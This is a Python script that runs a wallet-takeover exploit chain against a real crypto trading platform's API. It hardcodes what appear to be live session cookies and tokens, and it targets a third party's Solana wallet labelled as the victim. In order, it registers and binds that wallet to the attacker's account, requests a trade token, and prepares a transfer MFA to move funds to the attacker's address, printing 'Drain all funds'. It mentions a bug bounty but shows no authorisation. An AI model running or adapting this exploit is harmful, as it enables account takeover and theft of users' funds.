#!/usr/bin/env python3
"""
REGISTER_WALLET → BIND_WALLET CHAIN TEST

Theory: register_wallet links victim to our account,
then bind_wallet grants us MPC authority over it.
"""
import json
import requests

# Fresh cookies Jack provided
COOKIES = {
    '_ga_UGLVBMV4Z0': 'GS1.2.1784147274019075.6b09445dc224ac4ed190f0fc17562c09.%2BWBECXoGBNBcg0Fo8XQ6Zw%3D%3D.MgwbCP7e6%2F%2Fgxg46Zi4hxw%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.lf0gy6vV0UZfM%2Buod%2FYChA%3D%3D',
    '__cf_bm': 'BiwqYrKdqGkcrH0ZLK9f_OKFba2OCsbJ28phLs8iDi0-1784147278.2017257-1.0.1.1-nFEvU2MgsYGgu6HECjXk37MIl.qPDHnGC9TNy4X5mLQ_hqdjAngW69Qng5QVjwhaQkvk8bzJQDDqab54zo2xpYk0LzVwc4rsuc8AaEkVbHhs1LgUDKxdYJRDqJicqnnR',
    'g_state': '{"i_l":1,"i_ll":1784064572835,"i_e":{"enable_itp_optimization":24},"i_et":1784064572835,"i_b":"ZKMAELdKKMvOaL6Er88DW7w1hSd2zpaA4oygW8X+Lo4"}',
    '_ga_0XM0LYXGC8': 'GS2.1.s1784146779$o42$g1$t1784147281$j50$l0$h0',
    '_ga': 'GA1.1.1499118900.1783283677',
    '_csrf': 'L6Giyxap0kezMoy_ZZVuEuos0BMQCWu2',
    '_did': 'c800ab0b7d01aa37bc93aacdcbce271e',
    '_wt': 'AWpf5OQ6yKhuZEDm40uECgKO0pTyVxTLhc8Ds-Q',
    'sid': 'gmgn%7Ca04bda1a723a8218b4953962ef8e9169'
}

REFRESH_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNC0yMTE5LWM5MTMxNDEiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NjU2NjEyLCJpYXQiOjE3ODQwNjQ2MTIsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTk0NzA5OTctZmQxMC00YmE2LWEyYTAtMzExODUwNTNhMTM2IiwibmJmIjoxNzg0MDY0NjEyLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.H47Vj56YK1CYK08BpclIOKLFrootpc9Aud5BYkADA4GulAD2uaSEtwA5JYUG2Pj_PQak431Fk47_Q2R9rt4CSg"

VICTIM_SOL = "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"
OUR_SOL = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260714-2119-c913141",
    "from_app": "gmgn",
    "app_ver": "20260714-2119-c913141"
}

print("="*80)
print("🔥 REGISTER → BIND WALLET TAKEOVER TEST")
print("="*80)

# STEP 0: Refresh token
print("\n[STEP 0] Refresh access token")
r = requests.post(
    "https://gmgn.ai/account/account/refresh_access_token",
    params=PARAMS,
    headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    cookies=COOKIES,
    json={"refresh_token": REFRESH_TOKEN},
    timeout=10
)

print(f"Status: {r.status_code}")
if r.status_code != 200:
    print(f"FAILED: {r.text[:300]}")
    exit(1)

data = r.json()
print(f"Full response: {json.dumps(data, indent=2)}")

if data.get('code') != 0:
    print(f"FAILED: {json.dumps(data, indent=2)}")
    exit(1)

# Response format: {data: {data: {token: ..., expire_at: ...}}}
token_data = data.get('data', {}).get('data', {})
ACCESS_TOKEN = token_data.get('token')
expires = token_data.get('expire_at')

if not ACCESS_TOKEN:
    print(f"No access_token in response!")
    exit(1)

print(f"✅ Got fresh token (expires {expires})")
print(f"Token: {ACCESS_TOKEN[:50]}...")

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

# STEP 1: Register victim wallet
print("\n" + "="*80)
print("[STEP 1] Register victim wallet to our account")
print("="*80)

r = requests.post(
    "https://gmgn.ai/defi/quotation/v1/register_wallet",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "chain": "sol",
        "address": VICTIM_SOL,
        "user_id": OUR_USER_ID
    },
    timeout=10
)

print(f"POST /defi/quotation/v1/register_wallet")
print(f"Status: {r.status_code}")
print(f"Response: {json.dumps(r.json(), indent=2)}")

if r.json().get('code') != 0:
    print("❌ Register failed")
    exit(1)

print("✅ Victim wallet registered")

# STEP 2: Get bind_wallet txn_id
print("\n" + "="*80)
print("[STEP 2] Generate MFA params for bind_wallet")
print("="*80)

r = requests.post(
    "https://gmgn.ai/wallet-api/v1/generate_mfa_params",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "usage": "bind_wallet",
        "biz_params": {
            "wallet_address": VICTIM_SOL,
            "chain": "sol"
        }
    },
    timeout=10
)

print(f"POST /wallet-api/v1/generate_mfa_params {{usage: bind_wallet}}")
print(f"Status: {r.status_code}")
resp = r.json()
print(f"Response: {json.dumps(resp, indent=2)}")

if resp.get('code') != 0:
    print(f"❌ Failed to get bind_wallet txn_id: {resp.get('message')}")
    print("\nThis means bind_wallet requires the wallet to already be 'ours'")
    print("register_wallet alone doesn't grant bind authority")
    exit(1)

txn_id = resp['data']['txn_id']
print(f"✅ Got txn_id: {txn_id}")

# STEP 3: Call bind_wallet
print("\n" + "="*80)
print("[STEP 3] Call bind_wallet with victim address")
print("="*80)

r = requests.post(
    "https://gmgn.ai/account/bind_wallet",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "wallet_address": VICTIM_SOL,
        "txn_id": txn_id,
        "chain": "sol"
    },
    timeout=10
)

print(f"POST /account/bind_wallet")
print(f"Status: {r.status_code}")
bind_resp = r.json()
print(f"Response: {json.dumps(bind_resp, indent=2)}")

if bind_resp.get('code') != 0:
    print(f"\n❌ bind_wallet FAILED: {bind_resp.get('message')}")
    print("\nregister_wallet doesn't grant bind authority")
    exit(1)

print("\n💀💀💀 HOLY FUCK — BIND_WALLET SUCCEEDED!")
print("Victim wallet is now bound to our account!")

# STEP 4: Get trade_token
print("\n" + "="*80)
print("[STEP 4] Get trade_token for victim wallet")
print("="*80)

r = requests.post(
    "https://gmgn.ai/account/trade_token",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "wallet_address": VICTIM_SOL,
        "secret": "test123"
    },
    timeout=10
)

print(f"POST /account/trade_token")
print(f"Status: {r.status_code}")
trade_resp = r.json()
print(f"Response: {json.dumps(trade_resp, indent=2)[:500]}")

if trade_resp.get('code') == 0:
    print("\n💀💀💀💀💀 CRITICAL IDOR CONFIRMED!")
    print("We have MPC signing authority over victim wallet!")
    print("\nFull attack chain:")
    print("1. register_wallet(victim) → link to our account")
    print("2. generate_mfa_params(usage=bind_wallet) → get txn_id")
    print("3. bind_wallet(victim, txn_id) → bind victim to our MPC")
    print("4. trade_token(victim) → get signing authority")
    print("5. Drain all funds")
    print("\n$75,000+ BUG BOUNTY")
else:
    print(f"trade_token failed: {trade_resp.get('message')}")

# STEP 5: Try to generate transfer MFA
print("\n" + "="*80)
print("[STEP 5] Try to generate transfer MFA for victim wallet")
print("="*80)

r = requests.post(
    "https://gmgn.ai/wallet-api/v1/generate_mfa_params",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "usage": "transfer",
        "biz_params": {
            "transfer_id": "999",
            "transfer_type": "999",
            "chain": "sol",
            "from_address": VICTIM_SOL,
            "to_address": OUR_SOL,
            "amount": "1000",
            "amount_txt": "0.000001",
            "token_address": "So11111111111111111111111111111111111111112",
            "symbol": "SOL"
        }
    },
    timeout=10
)

print(f"POST /wallet-api/v1/generate_mfa_params {{usage: transfer}}")
print(f"Status: {r.status_code}")
transfer_resp = r.json()
print(f"Response: {json.dumps(transfer_resp, indent=2)}")

if transfer_resp.get('code') == 0:
    print("\n💀💀💀💀💀💀💀 WALLET TAKEOVER COMPLETE!")
    print("We can now drain victim funds!")
    print(f"Transfer txn_id: {transfer_resp['data']['txn_id']}")
else:
    print(f"Transfer MFA failed: {transfer_resp.get('message')}")
    print("But bind_wallet succeeded — that's still CRITICAL")

print("\n" + "="*80)
print("FINAL STATUS")
print("="*80)
